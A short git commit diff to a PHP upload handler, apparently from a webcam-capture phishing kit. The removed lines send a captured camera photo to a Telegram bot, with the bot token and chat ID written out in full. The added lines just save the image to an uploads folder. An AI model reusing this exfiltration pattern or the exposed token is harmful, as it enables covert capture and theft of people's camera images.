acb9e8502a772a78152cdc9ef9b8b4aa5570673d
Me Home <exploiter0253@gmail.com>
2024-04-03 14:02:59 +0330

    1

--- post.php
+++ post.php
@@ -1,15 +1,15 @@
 <?php
+// اطلاعات عکس را دریافت
+$imageData = $_POST['image'];
 
-$date = date('dMYHis');
-$imageData=$_POST['cat'];
+// تبدیل داده Base64 به فرمت فایل تصویر
+list($type, $imageData) = explode(';', $imageData);
+list(, $imageData) = explode(',', $imageData);
+$imageData = base64_decode($imageData);
 
+// ذخیره عکس در سرور
+$fileName = 'uploads/' . uniqid() . '.png'; // مسیر و نام فایل جدید
+file_put_contents($fileName, $imageData);
 
-$filteredData=substr($imageData, strpos($imageData, ",")+1);
-$unencodedData=base64_decode($filteredData);
-$fp = fopen( 'cam'.$date.'.png', 'wb' );
-fwrite( $fp, $unencodedData);
-fclose( $fp );
-
-file_get_contents("https://api.telegram.org/7151670122:AAHWQikBwVjPtpXIII3UCIuj9m7wp8Vi8iw/sendPhoto?chat_id=1640596676&photo=http://localhost/camt".$fp."&caption=radbon");
-exit();
+echo "آدرس عکس: " . $fileName;
 ?>
